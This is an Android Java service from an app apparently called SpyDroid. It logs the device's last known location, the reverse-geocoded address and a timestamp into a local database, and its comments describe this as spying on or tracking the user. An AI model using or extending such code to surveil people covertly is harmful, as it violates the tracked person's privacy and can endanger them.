package com.innolabs.spydroid;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.List;
import android.annotation.SuppressLint;
import android.app.Service;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.location.Address;
import android.location.Criteria;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationManager;
import android.os.IBinder;
import android.util.Log;

/**
 * Location Listener is a class used to listen or track the locations of the user and storing them to the database
 * 
 * @author Srikanth Rao
 * 
 * @see android.app.Service
 *
 */
@SuppressLint("SimpleDateFormat")
public class LocationsListener extends Service {

	/** Static variable dataBase of type DataBase */
	static DataBase dataBase;
	
	/** List<Address> variable which stores the location details of the device or the user */
	List<Address> locationdetails;
	
	/** String value to store the address of the device */
	String address = null;
	
	/** String variable for Database table name */
	String locationsTable = "LOCATIONS";
	
	/** Long type variable to store the date and time */
	long callDateTime;
	
	/** String value to show the TAG for the activity in the LOG CAT */
	public static String GPS_TAG = "SPY DROID - LOCATION LISTENER SERVICE";
	
	/** Method called when BindService is called from other instance
	 * 
	 * @param intent The Intent from which the method was called
	 * 
	 * @return null Noting is sent back to the bindService method
	 * 
	 * @see android.app.Service#onBind(Intent)
	 */
	@Override
	public IBinder onBind(Intent intent) {
		
		return null;
	}
	
	/**
	 * Method that starts as soon as the Location Listener service is started.
	 * 
	 * This method is used to log or spy or track the location details from the device and save them to a database.
	 * 
	 * @see android.app.Service#onStartCommand(Intent, int, int)
	 * 
	 * @return The Intent, Flags and startId which was sent as arguments
	 */
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
	
		Log.v(GPS_TAG, "Location Listener Service Started");
		
		// Creating or Opening the database and getting Write Permissions
		dataBase = new DataBase(this, "SPY_DROID");
		dataBase.getWritableDatabase();
		
		Log.v(GPS_TAG, "Database Opened or Created");
		
		// Creating or Opening table 
		dataBase.createTable(locationsTable, getTableValues());
		
		Log.v(GPS_TAG, "Opening or Creating Table : "+locationsTable);
		
		// Deleting the old table rows if exists
		dataBase.deleteTableElements("LOCATIONS");
		
		// Getting Location
		getLocation(LocationsListener.this);
		
		Log.v(GPS_TAG, "Getting Location");
		
		// Closing the database
		dataBase.close();
		
		return super.onStartCommand(intent, flags, startId);
	}

	/**
	 * Get location method used to get the location details of the user or the device
	 * 
	 * @param context The context from which the location details was requested
	 */
	private void getLocation(Context context) {
		
		Geocoder geoCoder;
		
		String bestProvider;
		
		double lattitude = 0, longitude = 0 ;
		
		// Accessing Location Manger
		LocationManager lm = (LocationManager) context.getSystemService(LOCATION_SERVICE);
		
		Log.v(GPS_TAG, "Accessing Location Manager");
		
		// Getting Best Provider
		Criteria cr = new Criteria();
		bestProvider = lm.getBestProvider(cr, false);
		Location location = lm.getLastKnownLocation(bestProvider);
		
		// Checking if location is not available
		if(location == null)
		{
			return;
		}
		
		else
		{
			geoCoder = new Geocoder(context);
			
			try 
			{
				// Getting Location details
				locationdetails = geoCoder.getFromLocation(location.getLatitude(), location.getLongitude(), 1);
				
				// Saving the retrieved location details 
				lattitude = locationdetails.get(0).getLatitude();
				longitude = locationdetails.get(0).getLongitude();
				address = locationdetails.get(0).getAddressLine(0).toString()+" , "+locationdetails.get(0).getAddressLine(1).toString()+" , "+locationdetails.get(0).getAddressLine(2).toString();
				
				long dateTime = System.currentTimeMillis();
				
				// Setting Simple Date Format
				SimpleDateFormat datePattern = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
				String dateString = datePattern.format(dateTime);
				
				Log.v(GPS_TAG, "Locatin Details : "+address);
				
				// Inserting the location values into database table
				ContentValues gps_contents = new ContentValues();
				gps_contents.put("time", dateString);
				gps_contents.put("lattitude", lattitude);
				gps_contents.put("longitude", longitude);
				gps_contents.put("address", address);
				dataBase.insertValues(locationsTable, gps_contents);
				
				Log.v(GPS_TAG, "Location details stored to database");
				
			} catch (IOException e) {
			
				// Printing the Exceptions
				e.printStackTrace();
			}
			
		}
	}
	

	/**
	 * Get table values is a generic method used to add the column name values to the table name. 
	 * @return table values i.e column names and its properties
	 */
	private String getTableValues() {
		
		String tablevalues = "SlNo INTEGER PRIMARY KEY,time TEXT, lattitude TEXT,longitude TEXT, address TEXT";
		
		Log.v(GPS_TAG, "Columns added to Location table : "+tablevalues);
		
		return tablevalues;
	}

}
